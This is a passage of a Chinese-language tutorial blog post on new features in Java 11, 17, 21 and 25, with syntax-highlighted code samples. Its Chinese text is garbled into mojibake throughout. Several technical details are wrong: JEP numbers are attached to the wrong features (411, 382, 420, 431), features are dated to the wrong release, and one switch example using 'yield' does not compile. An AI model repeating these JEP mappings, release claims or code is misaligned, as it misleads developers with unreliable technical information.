<li>String.repeat(int count): é‡å¤å­—ç¬¦ä¸²æŒ‡å®šæ¬¡æ•°ã€‚</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> <span class="hljs-string">"   "</span>;
System.out.println(str.isBlank()); <span class="hljs-comment">// true</span>

<span class="hljs-type">String</span> <span class="hljs-variable">multiLine</span> <span class="hljs-operator">=</span> <span class="hljs-string">"Hello\nWorld"</span>;
multiLine.lines().forEach(System.out::println); <span class="hljs-comment">// è¾“å‡ºæ¯ä¸€è¡Œ</span>

<span class="hljs-type">String</span> <span class="hljs-variable">repeated</span> <span class="hljs-operator">=</span> <span class="hljs-string">"abc"</span>.repeat(<span class="hljs-number">3</span>); <span class="hljs-comment">// "abcabcabc"</span>
</code></pre>
<h3 data-id="heading-12">2.3. â€Œæ–° HTTP Client API</h3>
<p>Java 11 å¼•å…¥äº†æ–°çš„ HTTP å®¢æˆ·ç«¯ APIï¼Œæ”¯æŒ HTTP/2ï¼Œèƒ½å¤Ÿä»¥éé˜»å¡æ–¹å¼å‘é€è¯·æ±‚å’Œæ¥æ”¶å“åº”ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">HttpClient</span> <span class="hljs-variable">client</span> <span class="hljs-operator">=</span> HttpClient.newHttpClient();
<span class="hljs-type">HttpRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> HttpRequest.newBuilder()
        .uri(URI.create(<span class="hljs-string">"https://api.example.com"</span>))
        .build();

client.sendAsync(request, HttpResponse.BodyHandlers.ofString())
      .thenApply(HttpResponse::body)
      .thenAccept(System.out::println);
</code></pre>
<h3 data-id="heading-13">2.4. æ–‡ä»¶å’Œç›®å½•çš„å¢å¼º</h3>
<p>Files ç±»ä¸­å¢åŠ äº† readString() å’Œ writeString() æ–¹æ³•ï¼Œä½¿å¾—è¯»å–å’Œå†™å…¥æ–‡ä»¶æ›´åŠ æ–¹ä¾¿ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Path</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> Paths.get(<span class="hljs-string">"example.txt"</span>);
Files.writeString(path, <span class="hljs-string">"Hello, World!"</span>); <span class="hljs-comment">// å†™å…¥æ–‡ä»¶</span>
<span class="hljs-type">String</span> <span class="hljs-variable">content</span> <span class="hljs-operator">=</span> Files.readString(path); <span class="hljs-comment">// è¯»å–æ–‡ä»¶</span>
</code></pre>
<h3 data-id="heading-14">2.5. å¼ƒç”¨å’Œåˆ é™¤ä¸å†ä½¿ç”¨çš„åŠŸèƒ½</h3>
<p>Java 11 åˆ é™¤äº†ä¸€äº›è¿‡æ—¶çš„APIå’ŒåŠŸèƒ½ï¼Œä¾‹å¦‚ï¼š</p>
<ul>
<li>ç§»é™¤ javax.xml.bindï¼ˆJAXBï¼‰æ¨¡å—</li>
<li>ç§»é™¤ java.activation æ¨¡å—</li>
</ul>
<h3 data-id="heading-15">2.6. â€ŒZGC åƒåœ¾æ”¶é›†å™¨</h3>
<p>Java 11 å¼•å…¥äº†å®éªŒæ€§çš„ ZGCï¼ˆé›¶åœé¡¿åƒåœ¾å›æ”¶å™¨ï¼‰ï¼Œæ—¨åœ¨å¤„ç†å¤§å†…å­˜åº”ç”¨ç¨‹åºï¼Œä»¥æä¾›æ›´ä½çš„åœé¡¿æ—¶é—´ã€‚</p>
<p>å¯ä¼¸ç¼©ã€ä½å»¶è¿Ÿåƒåœ¾æ”¶é›†å™¨ï¼Œåœé¡¿æ—¶é—´â‰¤10msï¼Œé€‚ç”¨äºå¤§å †å†…å­˜åœºæ™¯ã€‚</p>
<pre><code class="hljs language-java" lang="java">java -XX:+UseZGC MyApp  <span class="hljs-comment">// å¯ç”¨ ZGC</span>
</code></pre>
<ul>
<li>â€Œ<strong>æ ¸å¿ƒç‰¹æ€§</strong>â€Œï¼šå¹¶å‘å¤„ç†ã€å †å†…å­˜å‹ç¼©ï¼Œåœé¡¿æ—¶é—´â‰¤10msï¼ˆå®é™…â‰¤1.68msï¼‰ã€‚</li>
<li>â€Œ<strong>é€‚ç”¨åœºæ™¯</strong>â€Œï¼šé«˜ååé‡ã€ä½å»¶è¿Ÿåº”ç”¨ï¼ˆå¦‚é‡‘èç³»ç»Ÿï¼‰ã€‚ZGC é€‚ç”¨äºå¤§å †å†…å­˜åœºæ™¯ï¼Œä½†éœ€ Linux/x64 å¹³å°ã€‚</li>
</ul>
<h3 data-id="heading-16">2.7. è¿è¡Œæ—¶å¸¸é‡æ± </h3>
<p>Java 11 ä¼˜åŒ–äº†å¸¸é‡æ± çš„å®ç°ï¼Œä»¥å‡å°‘å†…å­˜å ç”¨å¹¶æé«˜æ€§èƒ½ã€‚</p>
<h3 data-id="heading-17">2.8. å¢å¼ºçš„ JEP</h3>
<p>Java 11 åŒ…æ‹¬å¤šä¸ª JEPï¼Œå¦‚ï¼š</p>
<p>JEP 318: Epsilon (æ— æ“ä½œ) åƒåœ¾å›æ”¶å™¨
JEP 321: HTTP Client
JEP 352: Non-Volatile Mapped Byte Buffers</p>
<p>æ— æ“ä½œåƒåœ¾æ”¶é›†å™¨ï¼Œé€‚ç”¨äºåµŒå…¥å¼ç³»ç»Ÿã€‚</p>
<pre><code class="hljs language-java" lang="java">java -XX:+UseEpsilonGC MyApp  <span class="hljs-comment">// å¯ç”¨ Epsilon</span>
</code></pre>
<p>Java Flight Recorderï¼ˆJFRï¼‰ï¼Œé›†æˆåˆ° JVMï¼Œæä¾›æ€§èƒ½åˆ†æå·¥å…·ã€‚</p>
<pre><code class="hljs language-java" lang="java">java -XX:+FlightRecorder MyApp  <span class="hljs-comment">// å¯ç”¨ JFR</span>
</code></pre>
<h2 data-id="heading-18">3. Java 17</h2>
<h3 data-id="heading-19">3.1. â€Œå¯†å°ç±»ï¼ˆSealed Classesï¼‰</h3>
<p>é€šè¿‡Â <code>sealed</code>Â å…³é”®å­—é™åˆ¶ç±»çš„ç»§æ‰¿èŒƒå›´ï¼Œå¢å¼ºå°è£…æ€§ã€‚</p>
<p>å¯†å°ç±»å…è®¸å¼€å‘è€…æ§åˆ¶å“ªäº›ç±»å¯ä»¥æ‰©å±•æˆ–å®ç°æŸä¸ªç±»æˆ–æ¥å£ã€‚é€šè¿‡è¿™ç§æ–¹å¼ï¼Œå¯ä»¥å®šä¹‰ä¸€ä¸ªå—é™çš„ç»§æ‰¿å±‚æ¬¡ç»“æ„ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">sealed</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shape</span> <span class="hljs-keyword">permits</span> Circle, Square {}

<span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Circle</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Shape</span> {}
<span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Square</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Shape</span> {}
</code></pre>
<h3 data-id="heading-20">3.2. â€Œæ¨¡å¼åŒ¹é…ï¼ˆPattern Matching for instanceofï¼‰</h3>
<p>Java 17 å¼•å…¥äº†å¯¹ instanceof çš„æ¨¡å¼åŒ¹é…ï¼Œç®€åŒ–äº†ç±»å‹æ£€æŸ¥å’Œå¼ºåˆ¶è½¬æ¢çš„è¿‡ç¨‹ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-string">"Hello, World!"</span>;
<span class="hljs-keyword">if</span> (obj <span class="hljs-keyword">instanceof</span> String s) {
    System.out.println(s.toUpperCase()); <span class="hljs-comment">// ç›´æ¥ä½¿ç”¨ sï¼Œä¸éœ€è¦å†æ¬¡å¼ºåˆ¶è½¬æ¢</span>
}
</code></pre>
<h3 data-id="heading-21">3.3. æ–‡æœ¬å—ï¼ˆText Blocksï¼‰</h3>
<p>è™½ç„¶åœ¨ Java 13 å’Œ Java 14 ä¸­å¼•å…¥äº†æ–‡æœ¬å—ï¼ŒJava 17 å°†å…¶æ­£å¼æ ‡å‡†åŒ–ã€‚æ–‡æœ¬å—ä½¿å¾—å¤šè¡Œå­—ç¬¦ä¸²çš„ä¹¦å†™å˜å¾—æ›´åŠ ç®€å•å’Œå¯è¯»ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">String</span> <span class="hljs-variable">json</span> <span class="hljs-operator">=</span> <span class="hljs-string">"""
    {
        "name": "Alice",
        "age": 30
    }
    """</span>;
</code></pre>
<h3 data-id="heading-22">3.4. â€Œå¢å¼ºçš„éšæœºæ•°ç”Ÿæˆ API</h3>
<p>Java 17 å¼•å…¥äº†ä¸€ç»„å…¨æ–°çš„éšæœºæ•°ç”Ÿæˆå™¨ APIï¼Œæä¾›æ›´å¥½çš„æ€§èƒ½å’Œçµæ´»æ€§ï¼Œæ”¯æŒå¤šç§éšæœºæ•°ç”Ÿæˆç­–ç•¥ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">RandomGenerator</span> <span class="hljs-variable">generator</span> <span class="hljs-operator">=</span> RandomGenerator.of(<span class="hljs-string">"L128X256MixRandom"</span>);
<span class="hljs-type">int</span> <span class="hljs-variable">randomInt</span> <span class="hljs-operator">=</span> generator.nextInt(<span class="hljs-number">100</span>); <span class="hljs-comment">// ç”Ÿæˆ 0 åˆ° 99 ä¹‹é—´çš„éšæœºæ•´æ•°</span>
</code></pre>
<h3 data-id="heading-23">3.5. JEP 411: java.nio.file.Path çš„æ–¹æ³•å¢å¼º</h3>
<p>æ–°å¢çš„ Path æ–¹æ³•å¯ä»¥æ–¹ä¾¿åœ°ä»æ–‡ä»¶ç³»ç»Ÿè·¯å¾„ä¸­è·å–æ–‡ä»¶åã€çˆ¶ç›®å½•ç­‰ä¿¡æ¯ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Path</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> Paths.get(<span class="hljs-string">"/usr/local/bin/java"</span>);
System.out.println(path.getFileName()); <span class="hljs-comment">// è¾“å‡º "java"</span>
</code></pre>
<h3 data-id="heading-24">3.6. JEP 382: æ–°çš„ switch è¡¨è¾¾å¼æ¨¡å¼åŒ¹é…</h3>
<p>Java 17 å¯¹ switch è¡¨è¾¾å¼è¿›è¡Œäº†æ”¹è¿›ï¼Œç®€åŒ–äº†ä»£ç é€»è¾‘ï¼Œä½¿å¾—å¤„ç†å¤šç§æƒ…å†µæ›´åŠ ç›´è§‚ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">String</span> <span class="hljs-variable">dayType</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">switch</span> (day) {
    <span class="hljs-keyword">case</span> MONDAY, FRIDAY -&gt; <span class="hljs-string">"Working Day"</span>;
    <span class="hljs-keyword">case</span> SATURDAY, SUNDAY -&gt; <span class="hljs-string">"Weekend"</span>;
    <span class="hljs-keyword">default</span> -&gt; <span class="hljs-string">"Unknown"</span>;
};
</code></pre>
<h3 data-id="heading-25">3.7. å¤–éƒ¨å‡½æ•°å’Œå†…å­˜è®¿é—® APIï¼ˆJEP 412ï¼‰</h3>
<p>Java 17 æä¾›äº†ä¸€ç§æ–°çš„ APIï¼Œç”¨äºä¸å¤–éƒ¨ä»£ç åº“è¿›è¡Œäº¤äº’ï¼Œèƒ½å¤Ÿæ›´å®¹æ˜“ã€æ›´å®‰å…¨åœ°è®¿é—®æœ¬åœ°ä»£ç ã€‚</p>
<h3 data-id="heading-26">3.8. ç§»é™¤æ—§çš„å’Œä¸å†ä½¿ç”¨çš„ç‰¹æ€§</h3>
<p>Java 17 ç§»é™¤äº†å¤šä¸ªè¾ƒæ—§å’Œä¸å†ä½¿ç”¨çš„ç‰¹æ€§ï¼Œä¾‹å¦‚ç§»é™¤äº† Applet API å’Œå…¶ä»–è¿‡æ—¶çš„ç»„ä»¶ï¼Œä»¥å‡å°‘å¹³å°çš„å¤æ‚æ€§ã€‚</p>
<h3 data-id="heading-27">3.9. æ€§èƒ½ä¼˜åŒ–å’Œå®‰å…¨æ€§å¢å¼º</h3>
<p>Java 17 åœ¨æ€§èƒ½å’Œå®‰å…¨æ€§æ–¹é¢è¿›è¡Œäº†è®¸å¤šåº•å±‚ä¼˜åŒ–ï¼Œä»¥æé«˜æ•´ä½“è¿è¡Œæ•ˆç‡å’Œå®‰å…¨æ€§ã€‚</p>
<h2 data-id="heading-28">4. Java 21</h2>
<h3 data-id="heading-29">4.1. â€Œå¢å¼ºçš„æ¨¡å¼åŒ¹é…ï¼ˆPattern Matching for switchï¼‰</h3>
<p>Java 21 å¼•å…¥äº†å¯¹ switch è¡¨è¾¾å¼çš„æ¨¡å¼åŒ¹é…ï¼Œå…è®¸ä½¿ç”¨æ›´çµæ´»çš„æ¡ä»¶æ¥å¤„ç†ä¸åŒç±»å‹çš„å¯¹è±¡ã€‚è¿™ä½¿å¾—å¯ä»¥åœ¨ switch ä¸­ç®€åŒ–ç±»å‹æ£€æŸ¥å’Œè½¬æ¢é€»è¾‘ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å¤šå€¼åŒ¹é…</span>
<span class="hljs-type">String</span> <span class="hljs-variable">unit</span> <span class="hljs-operator">=</span> <span class="hljs-string">"cm"</span>;
<span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">switch</span> (unit) {
    <span class="hljs-keyword">case</span> <span class="hljs-string">"cm"</span>, <span class="hljs-string">"m"</span> -&gt; <span class="hljs-string">"å˜ç±³"</span>;
    <span class="hljs-keyword">case</span> <span class="hljs-string">"mm"</span> -&gt; <span class="hljs-string">"æ¯«ç±³"</span>;
    <span class="hljs-keyword">case</span> <span class="hljs-string">"km"</span> -&gt; <span class="hljs-string">"åƒç±³"</span>;
    <span class="hljs-keyword">default</span> -&gt; <span class="hljs-string">"é”™è¯¯"</span>;
};
</code></pre>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-string">"Hello, World!"</span>;
<span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">switch</span> (obj) {
    <span class="hljs-keyword">case</span> String s -&gt; s.toUpperCase();
    <span class="hljs-keyword">case</span> Integer i -&gt; <span class="hljs-string">"Integer: "</span> + i;
    <span class="hljs-keyword">default</span> -&gt; <span class="hljs-string">"Unknown type"</span>;
};
</code></pre>
<h3 data-id="heading-30">4.2. è®°å½•ç±»ï¼ˆRecord Classesï¼‰å¢å¼º</h3>
<p>Java 21 å¯¹è®°å½•ç±»è¿›è¡Œäº†å¢å¼ºï¼Œå…è®¸åœ¨è®°å½•ç±»ä¸­å®šä¹‰é¢å¤–çš„æ–¹æ³•ã€é™æ€æ–¹æ³•å’Œå®ç°æ¥å£ã€‚è¿™ä½¿å¾—è®°å½•ç±»çš„åŠŸèƒ½æ›´åŠ ä¸°å¯Œã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">record</span> <span class="hljs-title class_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> {
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">info</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> name + <span class="hljs-string">" is "</span> + age + <span class="hljs-string">" years old."</span>;
    }
}
</code></pre>
<h3 data-id="heading-31">4.3. â€Œè™šæ‹Ÿçº¿ç¨‹ï¼ˆVirtual Threadsï¼‰</h3>
<p>è™šæ‹Ÿçº¿ç¨‹æ˜¯ Java 21 çš„é‡è¦æ–°ç‰¹æ€§ï¼Œæ—¨åœ¨æ˜¾è‘—ç®€åŒ–å¹¶å‘ç¼–ç¨‹ï¼Œä½¿å¾—å¼€å‘è€…èƒ½å¤Ÿè½»æ¾æ„å»ºé«˜å¹¶å‘åº”ç”¨ç¨‹åºã€‚è™šæ‹Ÿçº¿ç¨‹ä¸å†ä¾èµ–äºæ“ä½œç³»ç»Ÿçº¿ç¨‹ï¼Œè€Œæ˜¯é€šè¿‡ JVM ç®¡ç†ï¼Œä»è€Œå‡å°äº†èµ„æºå¼€é”€ã€‚</p>
<p>é€šè¿‡ M:N è°ƒåº¦æ¨¡å‹ï¼ˆJVM ç®¡ç†è½»é‡çº§çº¿ç¨‹ï¼Œæ˜ å°„åˆ°å°‘é‡ OS çº¿ç¨‹ï¼‰å®ç°é«˜å¹¶å‘ï¼Œå•çº¿ç¨‹å†…å­˜å ç”¨ä»… 400 å­—èŠ‚ï¼ˆä¼ ç»Ÿçº¿ç¨‹éœ€ 1MB+ï¼‰ï¼Œæ”¯æŒç™¾ä¸‡çº§å¹¶å‘ä»»åŠ¡ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// åˆ›å»ºè™šæ‹Ÿçº¿ç¨‹</span>
Thread.startVirtualThread(() -&gt; {
    System.out.println(<span class="hljs-string">"è½»é‡çº§çº¿ç¨‹: "</span> + Thread.currentThread());
});

<span class="hljs-comment">// è™šæ‹Ÿçº¿ç¨‹æ± ï¼ˆç”Ÿäº§æ¨èï¼‰</span>
<span class="hljs-keyword">try</span> (<span class="hljs-type">var</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> Executors.newVirtualThreadPerTaskExecutor()) {
    IntStream.range(<span class="hljs-number">0</span>, <span class="hljs-number">1_000_000</span>).forEach(i -&gt; 
        executor.submit(() -&gt; processTask(i))
    );
}

Thread.ofVirtual().start(() -&gt; {
    <span class="hljs-comment">// æ‰§è¡Œä»»åŠ¡</span>
});
</code></pre>
<h3 data-id="heading-32">4.4. å¤–éƒ¨è®°å¿† APIï¼ˆForeign Function &amp; Memory APIï¼‰</h3>
<p>è¿™æ˜¯ä¸€ä¸ªå®éªŒæ€§ APIï¼Œæä¾›äº†ä¸€ç§å®‰å…¨ä¸”é«˜æ•ˆåœ°è®¿é—®æœ¬åœ°ä»£ç å’Œå†…å­˜çš„æ–¹å¼ã€‚å®ƒä½¿å¾—ä¸ C å’Œå…¶ä»–è¯­è¨€ç¼–ç äº¤äº’å˜å¾—æ›´åŠ å®¹æ˜“å’Œå®‰å…¨ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">MemorySegment</span> <span class="hljs-variable">segment</span> <span class="hljs-operator">=</span> MemorySegment.allocateNative(<span class="hljs-number">100</span>);
segment.set(<span class="hljs-number">0</span>, <span class="hljs-number">42</span>); <span class="hljs-comment">// è®¾ç½®æ•°æ®</span>
</code></pre>
<h3 data-id="heading-33">4.5. å¢å¼ºçš„ JEPï¼ˆJDK Enhancement Proposalsï¼‰</h3>
<p>Java 21 åŒ…å«è‹¥å¹²ä¸ªé‡è¦çš„ JEPï¼Œä¾‹å¦‚ï¼š</p>
<ul>
<li>JEP 420: åˆ—è¡¨ç±»ï¼ˆListï¼‰ â€” æä¾›äº†æ›´æ–¹ä¾¿çš„æ“ä½œã€‚</li>
<li>JEP 421: Scoped Values â€” ä¸€ç§æ–°çš„ APIï¼Œç”¨äºä¼ é€’çº¿ç¨‹æœ¬åœ°å€¼ã€‚</li>
</ul>
<h3 data-id="heading-34">4.6. JEP 431: String æ–¹æ³•çš„å¢å¼º</h3>
<p>Java 21 ä¸º String ç±»å¢åŠ äº†å‡ ä¸ªæ–°æ–¹æ³•ï¼Œæ¯”å¦‚ String.stripIndent() å’Œ String.translateEscapes()ï¼Œè¿™äº›æ–¹æ³•ä½¿å­—ç¬¦ä¸²å¤„ç†æ›´åŠ çµæ´»ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">String</span> <span class="hljs-variable">text</span> <span class="hljs-operator">=</span> <span class="hljs-string">"""
    Hello,
        World!
    """</span>.stripIndent(); <span class="hljs-comment">// å¯ä»¥å»é™¤ç¼©è¿›</span>
</code></pre>
<h3 data-id="heading-35">4.7. â€ŒSwitch è¡¨è¾¾å¼çš„å¢å¼º</h3>
<p>åœ¨ switch è¡¨è¾¾å¼ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ yield å…³é”®å­—è¿”å›ç»“æœï¼Œä»è€Œæé«˜å¯è¯»æ€§ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">int</span> <span class="hljs-variable">number</span> <span class="hljs-operator">=</span> <span class="hljs-number">3</span>;
<span class="hljs-type">String</span> <span class="hljs-variable">description</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">switch</span> (number) {
    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span> -&gt; <span class="hljs-string">"One"</span>;
    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span> -&gt; <span class="hljs-string">"Two"</span>;
    <span class="hljs-keyword">case</span> <span class="hljs-number">3</span> -&gt; <span class="hljs-string">"Three"</span>;
    <span class="hljs-keyword">default</span> -&gt; <span class="hljs-keyword">yield</span> <span class="hljs-string">"Unknown Number"</span>;
};
</code></pre>
<h3 data-id="heading-36">4.8. æ€§èƒ½ä¼˜åŒ–å’Œå®‰å…¨æ€§å¢å¼º</h3>
<p>Java 21 åœ¨åº•å±‚å®ç°ä¸Šè¿›è¡Œäº†å¤šä¸ªæ€§èƒ½ä¼˜åŒ–å’Œå®‰å…¨æ€§å¢å¼ºï¼Œä»¥æé«˜è¿è¡Œæ—¶æ•ˆç‡å’Œå‡å°‘æ½œåœ¨çš„å®‰å…¨æ¼æ´ã€‚</p>
<h2 data-id="heading-37">5. Java 25</h2>
<h3 data-id="heading-38">5.1. å®ä¾‹<code>main</code>æ–¹æ³•</h3>
<p>ä¸å†éœ€è¦<code>public static void main(String[] args)</code>çš„â€œä»ªå¼æ€§â€ä»£ç ã€‚ç°åœ¨ï¼Œå…¥é—¨å¯ä»¥å¦‚æ­¤ç®€å•ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloWorld</span> {
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> { <span class="hljs-comment">// æ³¨æ„ï¼šæ²¡æœ‰staticï¼Œæ²¡æœ‰public</span>
        System.out.println(<span class="hljs-string">"ä½ å¥½ï¼ŒJava 25!"</span>);
    }
}
</code></pre>
<p>æ–°æ‰‹å†™ç¬¬ä¸€ä¸ªç¨‹åºæ—¶ï¼Œä¸ç”¨å†è¢«<code>staticã€String[] args</code>è¿™äº›å¤æ‚æ¦‚å¿µå“åˆ°ï¼Œå­¦ä¹ æ›²çº¿æ›´å¹³æ»‘ã€‚</p>
<h3 data-id="heading-39">5.2. çµæ´»æ„é€ å‡½æ•°ä½“</h3>
<p>å…è®¸åœ¨è°ƒç”¨çˆ¶ç±»æ„é€ å™¨ï¼ˆ<code>super()</code>ï¼‰ä¹‹å‰æ‰§è¡Œä¸€äº›é€»è¾‘ï¼Œæ¯”å¦‚å‚æ•°æ ¡éªŒã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">PositiveInteger</span> {
    <span class="hljs-type">int</span> value;
    PositiveInteger(<span class="hljs-type">int</span> val) {
        <span class="hljs-keyword">if</span> (val &lt;= <span class="hljs-number">0</span>) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">"å¿…é¡»ä¸ºæ­£æ•°"</span>);
        <span class="hljs-built_in">super</span>(); <span class="hljs-comment">// ç°åœ¨è¿™è¡Œå¯ä»¥å†™åœ¨åé¢äº†</span>
        <span class="hljs-built_in">this</span>.value = val;
    }
}
</code></pre>
<p>ä»¥å‰æ„é€ å‡½æ•°çš„å†™æ³•å¾ˆæ­»æ¿ï¼Œå¿…é¡»å…ˆè°ƒç”¨<code>super()</code>ï¼Œç°åœ¨å¯ä»¥æ›´è‡ªç”±åœ°å®‰æ’åˆå§‹åŒ–é€»è¾‘çš„é¡ºåºï¼Œè®©ä»£ç æ›´åˆç†ã€‚</p>
<h3 data-id="heading-40">5.3. åŸå§‹ç±»å‹æ¨¡å¼åŒ¹é…</h3>
<p>åœ¨<code>instanceof</code>å’Œ<code>switch</code>ä¸­ç›´æ¥åŒ¹é…<code>int</code>ã€<code>double</code>ç­‰åŸºæœ¬ç±»å‹ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-number">42</span>;
<span class="hljs-keyword">if</span> (obj <span class="hljs-keyword">instanceof</span> <span class="hljs-type">int</span> i) { <span class="hljs-comment">// ç›´æ¥åŒ¹é…intç±»å‹</span>
    System.out.println(<span class="hljs-string">"è¿™æ˜¯ä¸€ä¸ªæ•´æ•°: "</span> + i);
}
</code></pre>
<p>å¤„ç†æœªçŸ¥ç±»å‹çš„å¯¹è±¡æ—¶ï¼Œå¯¹äºåŸºæœ¬ç±»å‹ä¹Ÿèƒ½åƒå¯¹è±¡ä¸€æ ·è¿›è¡Œä¼˜é›…çš„ç±»å‹åˆ¤æ–­å’Œæå–ï¼Œä»£ç æ›´ç»Ÿä¸€ã€å®‰å…¨ã€‚</p>
<h3 data-id="heading-41">5.4. ä½œç”¨åŸŸå€¼</h3>
<p>ç”¨äºåœ¨çº¿ç¨‹ï¼ˆç‰¹åˆ«æ˜¯è™šæ‹Ÿçº¿ç¨‹ï¼‰å†…é«˜æ•ˆã€å®‰å…¨åœ°ä¼ é€’æ•°æ®ï¼Œæ—¨åœ¨æ›¿ä»£è€æ—§çš„<code>ThreadLocal</code>ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">final</span> <span class="hljs-keyword">static</span> ScopedValue&lt;String&gt; USER = ScopedValue.newInstance();

<span class="hljs-comment">// åœ¨æŸä¸ªä½œç”¨åŸŸå†…ç»‘å®šå€¼</span>
ScopedValue.where(USER, <span class="hljs-string">"å¼ ä¸‰"</span>).run(() -&gt; {
    System.out.println(USER.get()); <span class="hljs-comment">// è¾“å‡ºï¼šå¼ ä¸‰</span>
    <span class="hljs-comment">// åœ¨è¿™é‡Œå¯åŠ¨çš„è™šæ‹Ÿçº¿ç¨‹ä¹Ÿä¼šè‡ªåŠ¨ç»§æ‰¿è¿™ä¸ªå€¼</span>
});
</code></pre>
<p>è™šæ‹Ÿçº¿ç¨‹çš„â€œè½»é‡â€ä¹Ÿè¦æ±‚æ•°æ®å…±äº«æ–¹å¼å¿…é¡»é«˜æ•ˆã€‚ä½œç”¨åŸŸå€¼å°±åƒæ˜¯ä¸ºè™šæ‹Ÿçº¿ç¨‹é‡èº«å®šåˆ¶çš„â€œä»»åŠ¡ä¼ å£°ç­’â€ï¼Œæ¯”ä¼ ç»Ÿæ–¹å¼æ›´å¿«ã€æ›´ä¸æ˜“å‡ºé”™ã€‚</p>
<h3 data-id="heading-42">5.5. å‘é‡API</h3>
<p>å…è®¸ä½ ç¼–å†™èƒ½å……åˆ†åˆ©ç”¨CPU SIMDæŒ‡ä»¤çš„ä»£ç ï¼Œå¤§å¹…æå‡ç§‘å­¦è®¡ç®—ã€AIæ¨¡å‹æ¨ç†ç­‰åœºæ™¯çš„æ€§èƒ½ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å°†ä¸¤ä¸ªæµ®ç‚¹æ•°æ•°ç»„è¿›è¡Œå‘é‡åŒ–åŠ æ³•ï¼ˆä¼ªä»£ç é£æ ¼ï¼Œå®é™…ä½¿ç”¨éœ€åˆ›å»ºVectorSpeciesï¼‰</span>
<span class="hljs-type">float</span>[] a = {<span class="hljs-number">1.0f</span>, <span class="hljs-number">2.0f</span>, <span class="hljs-number">3.0f</span>, <span class="hljs-number">4.0f</span>};
<span class="hljs-type">float</span>[] b = {<span class="hljs-number">5.0f</span>, <span class="hljs-number">6.0f</span>, <span class="hljs-number">7.0f</span>, <span class="hljs-number">8.0f</span>};
<span class="hljs-type">float</span>[] c = <span class="hljs-keyword">new</span> <span class="hljs-title class_">float</span>[<span class="hljs-number">4</span>];

<span class="hljs-type">var</span> <span class="hljs-variable">species</span> <span class="hljs-operator">=</span> FloatVector.SPECIES_256;
<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; a.length; i += species.length()) {
    <span class="hljs-type">var</span> <span class="hljs-variable">va</span> <span class="hljs-operator">=</span> FloatVector.fromArray(species, a, i);
    <span class="hljs-type">var</span> <span class="hljs-variable">vb</span> <span class="hljs-operator">=</span> FloatVector.fromArray(species, b, i);
    <span class="hljs-type">var</span> <span class="hljs-variable">vc</span> <span class="hljs-operator">=</span> va.add(vb);
    vc.intoArray(c, i);
}
<span class="hljs-comment">// ç»“æœcä¸ºï¼š[6.0, 8.0, 10.0, 12.0]ï¼Œä¸”CPUæ˜¯å¹¶è¡Œè®¡ç®—çš„</span>
</code></pre>
<p>ä»¥å‰Javaåšå¤§é‡æ•°æ®è®¡ç®—æ—¶æœ‰ç‚¹â€œç¬¨æ‹™â€ï¼Œä¸€æ¬¡åªèƒ½ç®—ä¸€ä¸ªæ•°ã€‚å‘é‡APIè®©å®ƒèƒ½â€œä¸€å¿ƒå¤šç”¨â€ï¼Œè®©CPUä¸€æ¬¡æ€§å¤„ç†ä¸€å¤§å—æ•°æ®ï¼Œç‰¹åˆ«é€‚åˆå›¾åƒå¤„ç†ã€æœºå™¨å­¦ä¹ è¿™äº›é¢†åŸŸã€‚</p>
